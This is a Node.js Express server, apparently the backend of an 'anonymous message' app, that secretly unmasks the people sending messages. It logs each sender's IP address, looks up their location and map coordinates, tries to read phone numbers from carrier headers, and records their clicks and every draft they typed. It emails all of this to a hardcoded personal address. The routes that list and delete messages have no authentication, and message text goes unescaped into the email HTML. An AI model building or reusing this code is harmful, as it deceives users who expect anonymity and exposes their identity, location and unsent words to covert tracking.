const express = require('express');
const cors = require('cors');
const fs = require('fs').promises;
const path = require('path');
const axios = require('axios');
const UAParser = require('ua-parser-js');
const { Resend } = require('resend');

// Detect source app from referrer/user-agent
function detectSource(referrer = '', uaRaw = '') {
  const ref = referrer.toLowerCase();
  const ua = uaRaw.toLowerCase();

  const checks = [
    { key: 'instagram', value: 'Instagram' },
    { key: 'whatsapp', value: 'WhatsApp' },
    { key: 'wa.me', value: 'WhatsApp' },
    { key: 'facebook', value: 'Facebook' },
    { key: 'fb', value: 'Facebook' },
    { key: 'messenger', value: 'Messenger' },
    { key: 't.me', value: 'Telegram' },
    { key: 'telegram', value: 'Telegram' },
    { key: 'snapchat', value: 'Snapchat' },
    { key: 'twitter', value: 'Twitter/X' },
    { key: 'x.com', value: 'Twitter/X' },
    { key: 'tiktok', value: 'TikTok' }
  ];

  for (const { key, value } of checks) {
    if (ref.includes(key) || ua.includes(key)) return value;
  }
  if (ref && ref !== 'direct') return 'Other Referrer';
  return 'Direct/Unknown';
}

const app = express();
const PORT = process.env.PORT || 3000;

app.set('trust proxy', true);
app.use(cors());
app.use(express.json());

// Serve static files from frontend folder
app.use(express.static(path.join(__dirname, '../frontend')));

const resend = process.env.RESEND_API_KEY
  ? new Resend(process.env.RESEND_API_KEY)
  : null;

const MESSAGES_FILE = path.join(__dirname, 'messages.json');

async function sendEmail(subject, text, html) {
  if (!resend) {
    console.log('Email disabled: RESEND_API_KEY not set');
    return;
  }

  try {
    await resend.emails.send({
      from: process.env.FROM_EMAIL || 'onboarding@resend.dev',
      to: process.env.TO_EMAIL || 'isumuthsara2003@gmail.com',
      subject,
      text,
      html
    });
    console.log('Email notification sent');
  } catch (err) {
    console.error('Email send failed:', err.message);
  }
}

// Get all messages
app.get('/messages', async (req, res) => {
  try {
    const data = await fs.readFile(MESSAGES_FILE, 'utf8');
    res.json(JSON.parse(data));
  } catch {
    res.json([]);
  }
});

// Post message
app.post('/message', async (req, res) => {
  try {
    const { message } = req.body;
    if (!message?.trim()) {
      return res.status(400).json({ error: 'Message required' });
    }

    const data = await fs.readFile(MESSAGES_FILE, 'utf8').catch(() => '[]');
    const messages = JSON.parse(data);

    // Get sender's IP address (handle proxies)
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (typeof ip === 'string' && ip.includes(',')) {
      ip = ip.split(',')[0].trim();
    }
    if (ip === '::1') ip = '127.0.0.1';

    // Count previous messages from this IP
    const previousMessagesFromIP = messages.filter(msg => msg.ip === ip).length;
    const messageNumber = previousMessagesFromIP + 1;
    const messageLabel = messageNumber === 1 ? 'First message' : 
                        messageNumber === 2 ? 'Second message' :
                        messageNumber === 3 ? 'Third message' :
                        `${messageNumber}th message`;

    // Get location from IP with coordinates
    let location = 'Unknown';
    let coordinates = null;
    try {
      if (ip && ip !== '127.0.0.1' && ip !== '::1') {
        const r = await axios.get(`http://ip-api.com/json/${ip}`);
        if (r.data?.status === 'success') {
          location = `${r.data.city}, ${r.data.country}`;
          if (r.data.lat && r.data.lon) {
            coordinates = {
              latitude: r.data.lat,
              longitude: r.data.lon,
              accuracy: 5000
            };
          }
        }
      } else {
        location = 'Local/Localhost';
      }
    } catch (error) {
      console.error('Geolocation error:', error.message);
    }

    // Prefer client-provided precise coordinates
    const clientCoordinates = req.body.coordinates || null;

    // Attempt to capture phone from carrier headers
    const msisdnHeaderCandidates = [
      'x-msisdn', 'x-up-calling-line-id', 'x-wap-msisdn',
      'x-hutch-msisdn', 'x-source-msisdn', 'x-network-info'
    ];
    let phoneAuto = null;
    for (const key of msisdnHeaderCandidates) {
      const raw = req.headers[key];
      if (typeof raw === 'string' && raw.trim()) {
        const sanitized = raw.replace(/[^\d+]/g, '');
        if (sanitized.replace(/\D/g, '').length >= 7) {
          phoneAuto = sanitized;
          break;
        }
      }
    }

    // Parse User Agent for detailed device info
    const uaRaw = req.headers['user-agent'] || '';
    const parser = new UAParser(uaRaw);
    const ua = parser.getResult();

    // Capture referrer and language
    const referrer = req.headers['referer'] || 'Direct';
    const language = (req.headers['accept-language'] || 'Unknown').split(',')[0].trim();
    const source = detectSource(referrer, uaRaw);

    const newMessage = {
      id: Date.now(),
      message: message.trim(),
      timestamp: new Date().toISOString(),
      ip,
      messageNumber,
      messageLabel,
      location,
      coordinates: clientCoordinates || coordinates,
      timeOnPage: req.body.timeOnPage || null,
      clickPatterns: req.body.clickPatterns || [],
      textHistory: req.body.textHistory || [],
      userAgent: {
        browser: ua.browser.name || 'Unknown',
        browserVersion: ua.browser.version || 'Unknown',
        os: ua.os.name || 'Unknown',
        osVersion: ua.os.version || 'Unknown',
        deviceType: ua.device.type || 'Desktop'
      },
      referrer,
      source,
      language,
      shareTag: req.body.shareTag || null
    };
    if (phoneAuto) newMessage.phone = phoneAuto;

    messages.push(newMessage);
    await fs.writeFile(MESSAGES_FILE, JSON.stringify(messages, null, 2));

    // EMAIL (async, safe)
    const coord = newMessage.coordinates || {};
    const uaInfo = newMessage.userAgent || {};
    const mapsLink = (coord.latitude && coord.longitude)
      ? `https://www.google.com/maps?q=${coord.latitude},${coord.longitude}`
      : null;
    const osmLink = (coord.latitude && coord.longitude)
      ? `https://www.openstreetmap.org/?mlat=${coord.latitude}&mlon=${coord.longitude}#map=16/${coord.latitude}/${coord.longitude}`
      : null;

    const textBody = `
Message: ${newMessage.message}
Time (Sri Lanka - UTC +5:30): ${new Date(new Date(newMessage.timestamp).getTime() + (5.5 * 60 * 60 * 1000)).toISOString().replace('T', ' ').slice(0, 19)}
Time on Page: ${newMessage.timeOnPage ?? 'N/A'} seconds
Click Patterns: ${newMessage.clickPatterns.length > 0 ? newMessage.clickPatterns.map(c => `${c.element} at ${c.timestamp}ms`).join(', ') : 'None'}
Text History: ${newMessage.textHistory.length > 0 ? newMessage.textHistory.map(h => `"${h.text}" at ${h.timestamp}ms`).join(' → ') : 'None'}
IP: ${newMessage.ip}
Location: ${newMessage.location}
Coordinates: ${coord.latitude ?? 'N/A'}, ${coord.longitude ?? 'N/A'} (±${coord.accuracy ?? 'N/A'}m)
Browser: ${uaInfo.browser} ${uaInfo.browserVersion}
OS: ${uaInfo.os} ${uaInfo.osVersion}
Device: ${uaInfo.deviceType}
Referrer: ${newMessage.referrer}
Source: ${newMessage.source}
Share Tag: ${newMessage.shareTag ?? 'N/A'}
Language: ${newMessage.language}${phoneAuto ? `\nPhone: ${phoneAuto}` : ''}
${mapsLink ? `\nMap (Google): ${mapsLink}` : ''}
${osmLink ? `\nMap (OpenStreetMap): ${osmLink}` : ''}
    `.trim();
    const htmlBody = `
      <div style="font-family: Arial, sans-serif; line-height: 1.5;">
        <p><strong>Message:</strong> ${newMessage.message}</p>
        <p><strong>Time (Sri Lanka - UTC +5:30):</strong> ${new Date(new Date(newMessage.timestamp).getTime() + (5.5 * 60 * 60 * 1000)).toISOString().replace('T', ' ').slice(0, 19)}</p>
        <p><strong>Time on Page:</strong> ${newMessage.timeOnPage ?? 'N/A'} seconds</p>
        <p><strong>Click Patterns:</strong> ${newMessage.clickPatterns.length > 0 ? newMessage.clickPatterns.map(c => `${c.element} at ${c.timestamp}ms`).join(', ') : 'None'}</p>
        <p><strong>Text History (All Drafts):</strong><br/>
        ${newMessage.textHistory.length > 0 ? newMessage.textHistory.map((h, i) => `${i + 1}. "${h.text}" (at ${h.timestamp}ms)`).join('<br/>') : 'None'}</p>
        <p><strong>IP:</strong> ${newMessage.ip}</p>
        <p><strong>Location:</strong> ${newMessage.location}</p>
        <p><strong>Coordinates:</strong> ${coord.latitude ?? 'N/A'}, ${coord.longitude ?? 'N/A'} (±${coord.accuracy ?? 'N/A'}m)</p>
        <p><strong>Browser:</strong> ${uaInfo.browser} ${uaInfo.browserVersion}</p>
        <p><strong>OS:</strong> ${uaInfo.os} ${uaInfo.osVersion}</p>
        <p><strong>Device:</strong> ${uaInfo.deviceType}</p>
        <p><strong>Referrer:</strong> ${newMessage.referrer}</p>
        <p><strong>Source:</strong> ${newMessage.source}</p>
        <p><strong>Share Tag:</strong> ${newMessage.shareTag ?? 'N/A'}</p>
        <p><strong>Language:</strong> ${newMessage.language}</p>
        ${phoneAuto ? `<p><strong>Phone:</strong> ${phoneAuto}</p>` : ''}
        ${mapsLink ? `<p><a href="${mapsLink}" target="_blank">View on Google Maps</a></p>` : ''}
        ${osmLink ? `<p><a href="${osmLink}" target="_blank">View on OpenStreetMap</a></p>` : ''}
      </div>
    `;

    sendEmail('📩 New Anonymous Message', textBody, htmlBody);

    res.status(201).json(newMessage);
  } catch (err) {
    res.status(500).json({ error: 'Failed to save message' });
  }
});

// Delete message
app.delete('/message/:id', async (req, res) => {
  const id = Number(req.params.id);
  const data = await fs.readFile(MESSAGES_FILE, 'utf8').catch(() => '[]');
  const messages = JSON.parse(data).filter(m => m.id !== id);
  await fs.writeFile(MESSAGES_FILE, JSON.stringify(messages, null, 2));
  res.json({ success: true });
});

app.listen(PORT, () => {
  console.log('Server running on port', PORT);
});
